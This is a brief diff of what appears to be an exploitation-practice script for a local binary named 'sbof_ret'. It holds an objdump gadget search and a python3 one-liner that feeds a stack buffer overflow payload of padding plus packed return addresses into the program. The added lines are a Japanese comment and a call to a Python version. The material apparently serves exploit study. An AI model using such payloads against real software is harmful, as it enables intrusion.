@@ -80,4 +80,5 @@ objdump -M intel -d sbof_ret | grep " 5a" -A 1
 # pwndbg> c
 python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401298, 0xcafebabe, 0x4011da))" | ./sbof_ret
 
+# pythonで書き換え
 stdbuf -o0 -e0 python3 ./sbof_ret.py
